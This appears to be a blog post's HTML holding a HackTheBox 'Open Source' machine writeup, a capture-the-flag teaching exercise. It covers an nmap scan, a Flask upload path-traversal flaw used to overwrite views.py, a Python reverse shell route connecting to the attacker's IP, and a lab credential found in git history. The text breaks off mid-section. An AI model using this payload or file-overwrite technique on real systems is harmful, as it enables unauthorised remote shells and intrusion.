@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Open Source HackTheBox Writeup - My New Hugo Site</title><meta name="Description" content="This is 0xMesbaha"><meta property="og:url" content="http://example.org/posts/linux-machines/2022-10-08-open-source/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="Open Source HackTheBox Writeup">
+  <meta property="og:description" content="In This Box we are facing interesting Stuff like Docker , git hooks and other stuff. first we got access to a docker in the machine by overwritting the application code with a reverse shell. then we make port forwarding to scan the original host which has a Service running and we can see it from the docker. From this Service we can get access to the actual machine and from their we can get the root access using git hooks because the root seems to have a cronjob running git">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-10-08T00:45:19+02:00">
+    <meta property="article:modified_time" content="2022-10-08T00:45:19+02:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Git">
+    <meta property="article:tag" content="Docker">
+    <meta property="article:tag" content="Port-Forwarding">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Open Source HackTheBox Writeup">
+  <meta name="twitter:description" content="In This Box we are facing interesting Stuff like Docker , git hooks and other stuff. first we got access to a docker in the machine by overwritting the application code with a reverse shell. then we make port forwarding to scan the original host which has a Service running and we can see it from the docker. From this Service we can get access to the actual machine and from their we can get the root access using git hooks because the root seems to have a cronjob running git">
+      <meta name="twitter:site" content="@tinkerhell1337">
+<meta name="application-name" content="0xMesbaha">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/linux-machines/2022-10-08-open-source/" /><link rel="prev" href="http://example.org/posts/web-exploitation/2022-10-01-meme-generator/" /><link rel="next" href="http://example.org/posts/web-exploitation/2023-06-04-justctf_extra-safe-security-layers/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Open Source HackTheBox Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/linux-machines\/2022-10-08-open-source\/"
+        },"genre": "posts","keywords": "Hackthebox, git, docker, port-forwarding","wordcount":  955 ,
+        "url": "http:\/\/example.org\/posts\/linux-machines\/2022-10-08-open-source\/","datePublished": "2022-10-08T00:45:19+02:00","dateModified": "2022-10-08T00:45:19+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "0xMesbaha"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="My New Hugo Site">0xMesbaha</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="My New Hugo Site">0xMesbaha</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Open Source HackTheBox Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>0xMesbaha</a></span>&nbsp;<span class="post-category"> <a href="/categories/linux-machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Machines</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-10-08">2022-10-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;955 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><p>In This Box we are facing interesting Stuff like Docker , git hooks and other stuff. first we got access to a docker in the machine by overwritting the application code with a reverse shell. then we make port forwarding to scan the original host which has a Service running and we can see it from the docker. From this Service we can get access to the actual machine and from their we can get the root access using git hooks because the root seems to have a cronjob running git</p>
+<h1 id="scanning">Scanning</h1>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A -T5 10.129.168.8 -oN intial.txt
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">22</span> May <span class="m">2022</span> 18:39:53 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">5316</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;upcloud - Upload files <span class="k">for</span> Free!&lt;/title&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;/static/vendor/jquery/jquery-3.4.1.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;/static/vendor/popper/popper.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;/static/vendor/bootstrap/js/bootstrap.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;/static/js/ie10-viewport-bug-workaround.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/vendor/bootstrap/css/bootstrap.css&#34;</span>/&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34; /static/vendor/bootstrap/css/bootstrap-grid.css&#34;</span>/&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34; /static/vendor/bootstrap/css/bootstrap-reboot.css&#34;</span>/&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   HTTPOptions:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">22</span> May <span class="m">2022</span> 18:39:53 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Allow: HEAD, GET, OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   RTSPRequest:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="s2">&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;Content-Type&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;text/html;charset=utf-8&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;Error response&lt;/title&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/head&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;body&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;h1&gt;Error response&lt;/h1&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;p&gt;Error code: 400&lt;/p&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;p&gt;Message: Bad request version <span class="o">(</span><span class="s1">&#39;RTSP/1.0&#39;</span><span class="o">)</span>.&lt;/p&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/body&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    &lt;/html&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: upcloud - Upload files <span class="k">for</span> Free!</span></span></code></pre></div></div>
+<h1 id="enumeration">Enumeration</h1>
+<ul>
+<li>we are introduced with this page which doesn&rsquo;t contain much information or user inputs</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522204304.png"
+        data-srcset="/assets/images/open-source/20220522204304.png, /assets/images/open-source/20220522204304.png 1.5x, /assets/images/open-source/20220522204304.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522204304.png"
+        title="error" /></p>
+<ul>
+<li>viewing the page source will see there are 2 endpoints :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/download
+</span></span><span class="line"><span class="cl">/upcloud</span></span></code></pre></div></div>
+<ul>
+<li>at <code>/download</code> we can download a file <code>source.zip</code> which contains some source codes related to the web page we are into now.</li>
+</ul>
+<p>There is <code>Dockerfile</code> which reveals the web page we have seen is built from a docker container , so if we get a remote code execution from this application we will be in the container itself</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522204711.png"
+        data-srcset="/assets/images/open-source/20220522204711.png, /assets/images/open-source/20220522204711.png 1.5x, /assets/images/open-source/20220522204711.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522204711.png"
+        title="error" /></p>
+<p>It reveals also the application current working directory which is under <code>/app</code> , we know also it uses Flask</p>
+<p><strong>views.py</strong></p>
+<p>we can see from this code it has upload function which we find under <code>/upcloud</code>, and it will add the file to the path <code>os.getcwd()/public/uploads/</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">app.utils</span> <span class="kn">import</span> <span class="n">get_file_name</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">send_file</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">app</span> <span class="kn">import</span> <span class="n">app</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload_file</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file_name</span> <span class="o">=</span> <span class="n">get_file_name</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s2">&#34;public&#34;</span><span class="p">,</span> <span class="s2">&#34;uploads&#34;</span><span class="p">,</span> <span class="n">file_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;success.html&#39;</span><span class="p">,</span> <span class="n">file_url</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">host_url</span> <span class="o">+</span> <span class="s2">&#34;uploads/&#34;</span> <span class="o">+</span> <span class="n">file_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;upload.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/uploads/&lt;path:path&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_report</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">path</span> <span class="o">=</span> <span class="n">get_file_name</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s2">&#34;public&#34;</span><span class="p">,</span> <span class="s2">&#34;uploads&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">))</span></span></span></code></pre></div></div>
+<p>we can also see<code>get_file_name(f.filename)</code> function which takes the file name we sent as argument and filter the <code>../</code> from it as we see here</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522210114.png"
+        data-srcset="/assets/images/open-source/20220522210114.png, /assets/images/open-source/20220522210114.png 1.5x, /assets/images/open-source/20220522210114.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522210114.png"
+        title="error" /></p>
+<p>Looking at the <code>views.py</code> and testing the logic of saving files , we can see we are able to place the file we upload in any location we want</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522210721.png"
+        data-srcset="/assets/images/open-source/20220522210721.png, /assets/images/open-source/20220522210721.png 1.5x, /assets/images/open-source/20220522210721.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522210721.png"
+        title="error" /></p>
+<p>now we can try to upload file with the name <code>/app/app/templates/test.html</code> and check if we can write this file as we understood. However it didn&rsquo;t work :(</p>
+<p>Trying to name the file with an exist filename like <code>/app/app/templates/index.html</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522211127.png"
+        data-srcset="/assets/images/open-source/20220522211127.png, /assets/images/open-source/20220522211127.png 1.5x, /assets/images/open-source/20220522211127.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522211127.png"
+        title="error" /></p>
+<p>and we can overwrite an existed file indeed !</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522211005.png"
+        data-srcset="/assets/images/open-source/20220522211005.png, /assets/images/open-source/20220522211005.png 1.5x, /assets/images/open-source/20220522211005.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522211005.png"
+        title="error" /></p>
+<p>With that working we can overwrite the <strong><code>views.py</code></strong> which controls what to render in the application , we can choose to get us a reverse shell or a remote code execution.</p>
+<p>adding this route to the <code>views.py</code> so when we request the <code>/exec</code> a reverse connection will get back to us</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/exec&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">evil</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&#34;10.10.16.31&#34;</span><span class="p">,</span><span class="mi">9999</span><span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="kn">import</span> <span class="nn">pty</span><span class="p">;</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&#34;sh&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&#34;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522211601.png"
+        data-srcset="/assets/images/open-source/20220522211601.png, /assets/images/open-source/20220522211601.png 1.5x, /assets/images/open-source/20220522211601.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522211601.png"
+        title="error" /></p>
+<p>requesting the page <code>/exec</code> a connection get back to us</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522212349.png"
+        data-srcset="/assets/images/open-source/20220522212349.png, /assets/images/open-source/20220522212349.png 1.5x, /assets/images/open-source/20220522212349.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522212349.png"
+        title="error" /></p>
+<p>and as expected we can see we are in a docker :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522212442.png"
+        data-srcset="/assets/images/open-source/20220522212442.png, /assets/images/open-source/20220522212442.png 1.5x, /assets/images/open-source/20220522212442.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522212442.png"
+        title="error" /></p>
+<h1 id="user-access">User access</h1>
+<p>getting back to the source code we can find the <strong><code>.git</code></strong> , we can check the commits with</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git log --all</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522214021.png"
+        data-srcset="/assets/images/open-source/20220522214021.png, /assets/images/open-source/20220522214021.png 1.5x, /assets/images/open-source/20220522214021.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522214021.png"
+        title="error" /></p>
+<p>checking all , we can find this useful one here :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git show be4da71987bbbc8fae7c961fb2de01ebd0be1997</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/open-source/20220522214205.png"
+        data-srcset="/assets/images/open-source/20220522214205.png, /assets/images/open-source/20220522214205.png 1.5x, /assets/images/open-source/20220522214205.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/open-source/20220522214205.png"
+        title="error" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># seems like a credintials</span>
+</span></span><span class="line"><span class="cl">dev01:Soulless_Developer#2022</span></span></code></pre></div></div>
+<p>If we try to ssh with that user and we can&rsquo;t login with that password</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
